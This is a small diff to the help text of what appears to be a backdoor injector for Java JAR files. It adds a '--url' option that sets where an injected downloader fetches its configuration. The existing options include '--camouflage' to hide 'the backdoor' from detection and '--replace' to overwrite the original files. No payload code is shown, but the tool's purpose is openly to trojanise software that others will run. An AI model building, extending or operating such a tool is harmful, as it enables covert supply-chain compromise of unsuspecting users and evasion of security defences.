@@ -13,6 +13,7 @@ Options for --inject:
   --mode, -m <mode>         Processing mode: 'single' (default) or 'multiple'.
   --input, -i <path>        Input path. Directory for 'multiple' mode (default: 'in'), file for 'single' mode (default: 'in.jar').
   --output, -o <path>       Output path. Directory for 'multiple' mode (default: 'out'), file for 'single' mode (default: 'out.jar').
+  --url, -u <url>           Optional. Custom URL for the downloader to fetch its configuration.
   --replace, -r             Replace the input file(s) instead of creating new ones in the output directory.
   --camouflage              Camouflage the backdoor to avoid detection.
   --debug, -db              Display debug log.
